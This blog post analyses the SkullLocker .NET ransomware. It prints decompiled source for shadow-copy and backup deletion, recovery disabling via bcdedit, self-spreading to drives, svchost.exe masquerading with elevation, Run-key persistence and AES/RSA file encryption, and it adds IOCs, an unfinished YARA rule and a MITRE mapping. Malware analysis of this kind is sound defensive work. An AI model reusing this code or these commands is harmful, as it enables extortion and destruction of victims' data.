---
title: "SkulLocker Ransomware"
date: 2023-03-10T14:28:32+01:00
draft: false
tags: ["Ransomware", "Reversing", "SkullLocker"]
categories: ["Ransomware"]
---



# SkullLocker Ransomware 

SkullLocker  is a type of malwares that encrypts files on infected computers and demands payment for decryption. 
it spread thourgh the same techniques used by most of knowen malwares like phishing emails or malicious websites , software vulnerabilities.  it was discovered in 2016 and since then several of the ransomware have been found in the wild . 

the malware could perform the following functions/techniques : 
* randomize file extensions with 4 char strings (  Program.RandomStringForExtension(4)))
* Spread through svchost.exe process 
* add RegKey   : SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run  in $location using the key microsoft store
* locations : 
```cs
"\\Desktop";            
"\\Links";            
"\\Contacts";            
"\\Desktop";            
"\\Documents";            
"\\Downloads";            
"\\Pictures";            
"\\Music";            
"\\OneDrive";            
"\\Saved Games";            
"\\Favorites";            
"\\Searches";      
"\\Videos";
```

* Extensions :

```bash
".txt",".jar",".dat",".contact",".settings",".doc",".docx",".xls",".xlsx",".ppt",".pptx",".odt",".jpg",".mka",".mhtml",".oqy",".png",

".csv",".py",".sql",".mdb",".php",".asp",".aspx",".html",".htm",".xml",".psd",".pdf",".xla",".cub",".dae",".indd",".cs",".mp3",".mp4",

".dwg",".zip",".rar",".mov",".rtf",".bmp",".mkv",".avi",".apk",".lnk",".dib",".dic",".dif",".divx",".iso",".7zip",".ace",".arj",".bz2",

".cab",".gzip",".lzh",".tar",".jpeg",".xz",".mpeg",".torrent",".mpg",".core",".pdb",".ico",".pas",".db",".wmv",".swf",".cer",".bak",".backup",

".accdb",".bay",".p7c",".exif",".vss",".raw",".m4a",".wma",".flv",".sie",".sum",".ibank",".wallet",".css",".js",".rb",".crt",".xlsm",".xlsb",

".7z",".cpp",".java",".jpe",".ini",".blob",".wps",".docm",".wav",".3gp",".webm",".m4v",".amv",".m4p",".svg",".ods",".bk",".vdi",".vmdk",".onepkg",

".accde",".jsp",".json",".gif",".log",".gz",".config",".vb",".m1v",".sln",".pst",".obj",".xlam",".djvu",".inc",".cvs",".dbf",".tbi",".wpd",".dot",

".dotx",".xltx",".pptm",".potx",".potm",".pot",".xlw",".xps",".xsd",".xsf",".xsl",".kmz",".accdr",".stm",".accdt",".ppam",".pps",".ppsm",".1cd",

".3ds",".3fr",".3g2",".accda",".accdc",".accdw",".adp",".ai",".ai3",".ai4",".ai5",".ai6",".ai7",".ai8",".arw",".ascx",".asm",".asmx",".avs",".bin",

".cfm",".dbx",".dcm",".dcr",".pict",".rgbe",".dwt",".f4v",".exr",".kwm",".max",".mda",".mde",".mdf",".mdw",".mht",".mpv",".msg",".myi",".nef",".odc",

".geo",".swift",".odm",".odp",".oft",".orf",".pfx",".p12",".pl",".pls",".safe",".tab",".vbs",".xlk",".xlm",".xlt",".xltm",".svgz",".slk",".tar.gz",

".dmg",".ps",".psb",".tif",".rss",".key",".vob",".epsp",".dc3",".iff",".onepkg",".onetoc2",".opt",".p7b",".pam",".r3d"
```



## Indicators of Compromise

The sample used in this article is the same one mentioned by [macert](https://www.dgssi.gov.ma/fr/content/4061060323-skulllocker-ransomware.html) team .

| Type   | Indicator                                                        | Description                 |
| ------ | ---------------------------------------------------------------- | --------------------------- |
| SHA256 | bb5ca9d8de51734dbd14dc081c7c892d819cd14fafd7ccd62849d70f9e679369 | SkullLocker Main Ransomware |       |                                                                  |                             |

## Analysis 


According to first analysis it appears that the ransomware is built using .net .

![detect it easy](/images/die.png)

the ransomware doesn't have any obfuscation techniques all you need to decompile it using .net tools and you will have the source code ( i personaly hate these kind of ransomwares since i do not enjoy breaking them down). 

in order to understand how it works we will cover the principal methodes and functions that is used to encrypt files and how it work in general .

### Infection Chain

```cs
private static void deleteShadowCopies()
		{
			Program.runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
		}
```

- delete all the shadow copies on the system to prevent users from recovering previous versions of files or folders.

```cs
private static void disableRecoveryMode()
		{
			Program.runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
		}
```

- configure the Windows Boot Manager settings to ignore any boot failures and disable the automatic startup repair .

```cs
private static void deleteBackupCatalog()
		{
			Program.runCommand("wbadmin delete catalog -quiet");
		}
```

-  Delete the backup catalog. The backup catalog is a database that contains information about the backups created using Windows Backup . 


```cs
private static string spreadName = "skull.exe";
```


```cs
private static void spreadIt(string spreadName)
		{
			foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
			{
				if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
				{
					try
					{
						File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
					}
					catch
					{
					}
				}
			}
		}
```

- the malware spreading itself across the computer's drives except for "C" under the name of skull.exe 

```cs
private static string processName = "svchost.exe";
```

```cs
private static void copyResistForAdmin(string processName)
		{
			string friendlyName = AppDomain.CurrentDomain.FriendlyName;
			string location = Assembly.GetExecutingAssembly().Location;
			Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
			string text2 = text + processName;
			ProcessStartInfo startInfo = new ProcessStartInfo(text2)
			{
				UseShellExecute = true,
				Verb = "runas",
				WindowStyle = ProcessWindowStyle.Normal,
				WorkingDirectory = text
			};
			Process process = new Process();
			process.StartInfo = startInfo;
			if (friendlyName != processName || location != text2)
			{
				if (!File.Exists(text2))
				{
					File.Copy(friendlyName, text2);
					try
					{
						Process.Start(startInfo);
						Environment.Exit(1);
						return;
					}
					catch (Win32Exception ex)
					{
						if (ex.NativeErrorCode == 1223)
						{
							Program.copyResistForAdmin(processName);
						}
						return;
					}
				}
				try
				{
					File.Delete(text2);
					Thread.Sleep(200);
					File.Copy(friendlyName, text2);
				}
				catch
				{
				}
				try
				{
					Process.Start(startInfo);
					Environment.Exit(1);
				}
				catch (Win32Exception ex2)
				{
					if (ex2.NativeErrorCode == 1223)
					{
						Program.copyResistForAdmin(processName);
					}
				}
			}
		}
```

- Copies  Friendlyname (current executable name) if it doesnt already exist to **/AppData/Roaming/** under the name of **svchost.exe** then creates a new ProcessStartInfo object that specifies the process to start and sets the appropriate properties for the process to run with elevated privileges.

```cs
private static void addLinkToStartup()
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
			string str = Process.GetCurrentProcess().ProcessName;
			using (StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + str + ".url"))
			{
				string location = Assembly.GetExecutingAssembly().Location;
				streamWriter.WriteLine("[InternetShortcut]");
				streamWriter.WriteLine("URL=file:///" + location);
				streamWriter.WriteLine("IconIndex=0");
				string str2 = location.Replace('\\', '/');
				streamWriter.WriteLine("IconFile=" + str2);
			}
		}
```

- also it adds a link file to this  path ( **\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup**)  under **svchost.url** .

```cs
private static void registryStartup()
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
				registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
			}
			catch
			{
			}
		}
```

- utilizing the SetValue method to assign the location of the present executable file as the value for the "**Microsoft Store**" key. The objective is to add a registry entry to the Windows registry, which enables the current application to launch automatically during system startup

### Encryption methodes

#### Directory Encryption
```cs
	private static void encryptDirectory(string location)
		{
			try
			{
				string[] files = Directory.GetFiles(location);
				bool flag = true;
				for (int i = 0; i < files.Length; i++)
				{
					try
					{
						string extension = Path.GetExtension(files[i]);
						string fileName = Path.GetFileName(files[i]);
						if (Array.Exists<string>(Program.validExtensions, (string E) => E == extension.ToLower()) && fileName != Program.droppedMessageTextbox)
						{
							FileInfo fileInfo = new FileInfo(files[i]);
							fileInfo.Attributes = FileAttributes.Normal;
							if (fileInfo.Length < 2117152L)
							{
								if (Program.encryptionAesRsa)
								{
									Program.EncryptFile(files[i]);
								}
							}
							else if (fileInfo.Length > 200000000L)
							{
								Random random = new Random();
								int length = random.Next(200000000, 300000000);
								string @string = Encoding.UTF8.GetString(Program.random_bytes(length));
								File.WriteAllText(files[i], Program.randomEncode(@string));
								File.Move(files[i], files[i] + "." + Program.RandomStringForExtension(4));
							}
							else
							{
								string string2 = Encoding.UTF8.GetString(Program.random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
								File.WriteAllText(files[i], Program.randomEncode(string2));
								File.Move(files[i], files[i] + "." + Program.RandomStringForExtension(4));
							}
							if (flag)
							{
								flag = false;
								File.WriteAllLines(location + "/" + Program.droppedMessageTextbox, Program.messages);
							}
						}
					}
					catch
					{
					}
				}
				string[] directories = Directory.GetDirectories(location);
				for (int j = 0; j < directories.Length; j++)
				{
					Program.encryptDirectory(directories[j]);
				}
			}
			catch (Exception)
			{
			}
		}

```

This function is responsible of encryption directories , it take `location` as an input . This `location` is defined in the `lookForDirectories`  function which refer to the `Desktop`
 directory in windows env . 
 
```cs
	string location = Program.userDir + Program.userName + "\\Desktop";
```

```cs
Program.encryptDirectory(location);
```

The main idea of the function is to loop through the  `Desktop` directory and list all files and subdirectories.  the `getFiles` is responsible of retrieving the files in the `location`  using the class `Directory` which contains a bunch of things that is verified such as : fullpath, userPath, searOption 

`string[] files = Directory.GetFiles(location);`
after this it loop through files , the first thing that the malware checks/validate  the file extension .

`if (Array.Exists<string>(Program.validExtensions, (string E) => E == extension.ToLower()) && fileName != Program.droppedMessageTextbox)`

if the file extension should not be the same as the malware which is indecated in the `droppedMessageTextbo`  which is basicaly the file that the malware write when the encryption is finished and contains the threat actors message 
`private static string droppedMessageTextbox = "read_it.txt";`

the last part of this is about checking the size of the files is the file size is less than `2117152`  which is approximatly 2MB  `if (fileInfo.Length < 2117152L)` 
it encrypt the file using `EncrypotFile` which we will see later in the post .
the second if condition is about checking again the size of the file if it's bigger than 200000000bytes it generate a random a strng of the length between 200000000 and 300000000 bytes, than it encodes it using `randomEncode` method . after the encoding it writes it to the file using the `WriteAllText`  than appending a random 4 characters extension generated by the `RandomStringForExtension`  .
.

#### file Encryption 
```cs
analyse this : 	public static void EncryptFile(string file)
		{
			byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
			string text = Program.CreatePassword(20);
			byte[] bytes = Encoding.UTF8.GetBytes(text);
			byte[] inArray = Program.AES_Encrypt(bytesToBeEncrypted, bytes);
			File.WriteAllText(file, "<EncryptedKey>" + Program.RSAEncrypt(text, Program.rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
			File.Move(file, file + "." + Program.RandomStringForExtension(4));
		}

```

this function is the function that encrypt the files it takes file as an input and reads all the file  bytes `bytesToBeEncrypted` , than it creates a password of length 20 using the `CreatePassword` method _ we will cover it in other section _  , this password is converted to bytes array using UTF-8 encoding . the `bytesToBeEncrypted`  is using AES encryption algorithm and the bytes password using `AES_Encrypt`  method _ we will cover it in other secion _  . the last part is about moving files using `move` and appending new extension using  `RandomStringForExtension` with 4 character string  .

#### RSA encryption

```cs
	// Token: 0x06000010 RID: 16 RVA: 0x00002764 File Offset: 0x00000964
		public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
		{
			byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
			string result;
			using (RSACryptoServiceProvider rsacryptoServiceProvider = new RSACryptoServiceProvider(1024))
			{
				try
				{
					rsacryptoServiceProvider.FromXmlString(publicKeyString.ToString());
					byte[] inArray = rsacryptoServiceProvider.Encrypt(bytes, true);
					string text = Convert.ToBase64String(inArray);
					result = text;
				}
				finally
				{
					rsacryptoServiceProvider.PersistKeyInCsp = false;
				}
			}
			return result;
		}

```

the rsaEncrypt method takes a `textToEncrypt`  and a `publicKeyString` as inputs .
first it takes the `textToEncrypt` and convert it to byte array again using UTF-8 encodiing , and generate an RSA encryption object with a key size of 1024  using `rsaCryptoServiceProvider` . this encryption is used to encrypt the byte array and convert them into base64 encoding string .

#### AES encryption

```cs
	// Token: 0x0600000E RID: 14 RVA: 0x000025F8 File Offset: 0x000007F8
		public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[]
			{
				1,
				2,
				3,
				4,
				5,
				6,
				7,
				8
			};
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
				{
					rijndaelManaged.KeySize = 256;
					rijndaelManaged.BlockSize = 128;
					Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
					rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
					rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
					rijndaelManaged.Mode = CipherMode.CBC;
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
					{
						cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
						cryptoStream.Close();
					}
					result = memoryStream.ToArray();
				}
			}
			return result;
		}


```

the AES encrupt methode is the one responsible of encryption it takes the bytestobeencrypted and the passwordbytes we mentioned above.

the methode seems to be like all the AES encryption implementation in any programing language , it initialize the sale in a fixed array also it initialize the MemoryStream onject to store the encrypted data , it initialize also the `RijndaeManaged` to configure the encryption settings .
we can also see the usage of the `Rfc2898DeriveBytes`  object which will generate the key and IV  based on the PasswordBytes and the salt values . the 1000 at the end i guess its for iterations .
at the end of the methode we see `CryptoStream ` which is initailiazed to write the encrypted Data to `MemoRyStream` 
the data is encrypted using the RijndaelManaged object and the bytestoBeEncrypted is written to CryptoStream which will be converted to MemoryStream at the end .


#### Password used in the encryption 
```cs
		public static string CreatePassword(int length)
		{
			StringBuilder stringBuilder = new StringBuilder();
			Random random = new Random();
			while (0 < length--)
			{
				stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
			}
			return stringBuilder.ToString();
		}

```

thios function is reponsible of creating the password used in functions above to encrypt files , it take a length as inpuit , first it creates a `StringBuilder`  which is used to store the password and create a `random`  object to generate random integers, those steps are used to loop through the length within each loop iterations it appends a random character from the string containing all possible characters that can be used in the password .
the end of the methode returns the final password .


## Detection

### YARA 
```cpp
import "dotnet"

rule Mal_SkulLocker_2023{
	
    meta:
        author      = "the hacker news bdarija"
        description = "SkullLocker Ransomware"
        created     = "2023-03-009"
    strings:
       #TODO
    condition:
        # TODO

}
```

### Mitre Attack  

| ID        | Tactic                               | Technique                                                             | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| --------- | ------------------------------------ | --------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| T1037.005 | Persistence, Privilege Escalation    | Boot or Logon Initialization Scripts                                  | Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items                                                                                                                                                                                         |
| T1055     | Defense Evasion Privilege Escalation | Process Injection                                                     | Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. |
| T1012     | Discovery                            | RegKey execution                                                      | Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.                                                                                                                                                                                                                                                                                                                                                                                                     |
| T1222     | Defense Evasion                      | File And Directory Permission modificatioin                           | Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.                                                                                                                                                                                                                                                                                                                                                                                                      |
| T1547.001 | Persistence, Privilege escalation    | Boot or logon autostart execution : registry run keys /startup folder | Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in                                                                                                                                                                                                                                                                       |
| T1070.004 | Defense Evasions                     | Indicator Removel : File deletion                                     | Adversaries may delete files left behind by the actions of their intrusion activity.                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
|           |                                      |                                                                       |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |

# References
* [Malware Bazar](https://bazaar.abuse.ch/sample/bb5ca9d8de51734dbd14dc081c7c892d819cd14fafd7ccd62849d70f9e679369/)
* [DGSSI](https://www.dgssi.gov.ma/fr/content/4061060323-skulllocker-ransomware.html)


## Contributors
- [0xpwny](todo)
- [c3p0d4y](https://twitter.com/c3p01337)
